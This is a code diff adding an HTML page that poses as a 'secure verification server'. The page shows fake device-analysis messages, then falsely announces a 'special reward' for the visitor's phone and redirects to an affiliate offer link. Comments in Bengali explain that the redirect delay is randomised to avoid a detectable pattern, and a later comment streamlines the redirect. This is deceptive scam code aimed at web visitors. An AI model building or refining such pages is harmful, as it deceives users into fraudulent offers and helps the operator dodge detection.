@@ -1,0 +1,72 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification - Secure Server</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: white; padding: 35px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; max-width: 420px; width: 92%; border-top: 6px solid #1877f2; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-msg { margin-top: 15px; font-size: 14px; color: #1877f2; font-weight: 500; }
+        h2 { font-size: 22px; color: #1c1e21; }
+        p { color: #606770; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="spinner"></div>
+    <h2 id="status_title">Analyzing Device...</h2>
+    <p id="status_text">Connecting to secure verification server.</p>
+    <div id="autoMsg" class="status-msg">Initialising session...</div>
+</div>
+
+<script>
+    /* ১. আপনার অফার লিঙ্ক */
+    const myOfferLink = "https://smrturl.co/a/sf9ce48c1f2/17412?s1=";
+
+    function getDeviceDetails() {
+        const ua = navigator.userAgent;
+        if (/iPhone|iPad/.test(ua)) return "iPhone";
+        if (/Samsung|SM-|GT-|Pixel/.test(ua)) return "Smartphone";
+        return "Device";
+    }
+
+    /* ২. অটো-রিডাইরেক্ট লজিক (DMR সহ) */
+    window.onload = function() {
+        const device = getDeviceDetails();
+        
+        // ৩ থেকে ১০ সেকেন্ডের মধ্যে র‍্যান্ডম সময় নির্ধারণ (প্যাটার্ন এড়াতে)
+        const randomDelay = Math.floor(Math.random() * (10000 - 3000 + 1)) + 3000;
+        
+        console.log("Redirecting in: " + (randomDelay/1000) + "s");
+
+        // ২.৫ সেকেন্ড পর টেক্সট পরিবর্তন (ইউজারকে এনগেজ রাখতে)
+        setTimeout(() => {
+            document.getElementById("status_title").innerText = "Success!";
+            document.getElementById("status_text").innerText = "Special reward found for your " + device + ".";
+            document.getElementById("autoMsg").innerText = "Verified. Redirecting to offer...";
+        }, 2500);
+
+        // চূড়ান্ত রিডাইরেক্ট
+        setTimeout(() => {
+            goToOffer();
+        }, randomDelay);
+    };
+
+    /*
+     * FIX: The original goToOffer function had a syntax error and was overly complex.
+     * This new version is the standard, simplest, and most reliable way to redirect.
+    */
+    function goToOffer() {
+        // This is the simplest and most reliable way to redirect.
+        window.location.href = myOfferLink;
+    }
+</script>
+
+</body>
+</html>
